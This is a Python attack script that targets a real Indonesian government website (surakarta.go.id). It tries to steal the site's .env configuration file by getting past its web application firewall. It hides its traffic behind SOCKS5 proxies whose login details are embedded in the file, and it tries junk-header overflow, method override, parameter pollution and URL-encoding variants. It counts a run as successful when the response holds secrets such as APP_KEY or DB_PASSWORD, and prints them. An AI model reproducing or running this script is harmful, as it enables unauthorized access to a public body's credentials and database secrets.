import requests
import socks
import socket
import sys
import random
import time

# --- CONFIGURATION ---
TARGET_URL = "https://surakarta.go.id/.env"
PROXIES = [
    "23.95.150.145:6114:oyyvimta:3olvpyzbkfhq",
    "198.23.239.134:6540:oyyvimta:3olvpyzbkfhq",
    "107.172.163.27:6543:oyyvimta:3olvpyzbkfhq",
    "198.105.121.200:6462:oyyvimta:3olvpyzbkfhq",
    "64.137.96.74:6641:oyyvimta:3olvpyzbkfhq"
]

def set_proxy():
    try:
        p = random.choice(PROXIES).split(":")
        socks.set_default_proxy(socks.SOCKS5, p[0], int(p[1]), username=p[2], password=p[3])
        socket.socket = socks.socksocket
    except: pass

def check_success(resp, technique_name):
    # Success means: 200 OK AND contains sensitive keywords AND is NOT a redirect
    if resp.status_code == 200:
        if "APP_KEY=" in resp.text or "DB_PASSWORD=" in resp.text:
            print(f"[!!!] BYPASS SUCCESS ({technique_name}) -> CONFIRMED .env CONTENT!")
            print(resp.text[:200])
            return True
        elif "<meta http-equiv=\"refresh\"" in resp.text or "Redirecting" in resp.text:
            print(f"[-] Failed ({technique_name}): WAF Deceived us with Fake 200 OK (Redirect)")
        else:
            print(f"[?] Weird ({technique_name}): 200 OK but no keywords. Potentially encrypted config?")
    elif resp.status_code == 403:
        print(f"[-] Blocked ({technique_name}): 403 Forbidden")
    else:
        print(f"[-] Failed ({technique_name}): Status {resp.status_code}")
    return False

def run_tests():
    print(f"[+] Starting Aggressive WAF Evasion on {TARGET_URL}...")
    set_proxy()

    # 1. Junk Header Overflow
    print("\n[*] Testing Junk Header Overflow...")
    try:
        junk_headers = {"X-Trash": "A" * 15000} # 15KB Header
        r = requests.get(TARGET_URL, headers=junk_headers, verify=False, timeout=15)
        if check_success(r, "Junk Header"): return
    except Exception as e: print(f"    Error: {e}")

    # 2. HTTP Method Override (POST as GET)
    print("\n[*] Testing HTTP Method Override...")
    try:
        headers = {"X-HTTP-Method-Override": "GET"}
        r = requests.post(TARGET_URL, headers=headers, verify=False, timeout=10)
        if check_success(r, "Method Override"): return
    except Exception as e: print(f"    Error: {e}")

    # 3. Parameter Pollution
    print("\n[*] Testing Parameter Pollution...")
    try:
        target = TARGET_URL + "?&"
        r = requests.get(target, verify=False, timeout=10)
        if check_success(r, "Param Pollution ?&"): return
    except Exception as e: print(f"    Error: {e}")

    # 4. URL Encoding / Case Variation
    print("\n[*] Testing URL Encoding / Case Variation...")
    variations = [
        "https://surakarta.go.id/.Env",
        "https://surakarta.go.id/%2eenv",
        "https://surakarta.go.id/.%65nv",
        "https://surakarta.go.id/..%2f.env"
    ]
    for v in variations:
        try:
            r = requests.get(v, verify=False, timeout=10)
            if check_success(r, f"Variation {v}"): return
        except: pass

    print("\n[-] All WAF Evasion techniques failed. WAF is robust.")

if __name__ == "__main__":
    try:
        run_tests()
    except KeyboardInterrupt:
        print("\n[!] Aborted.")
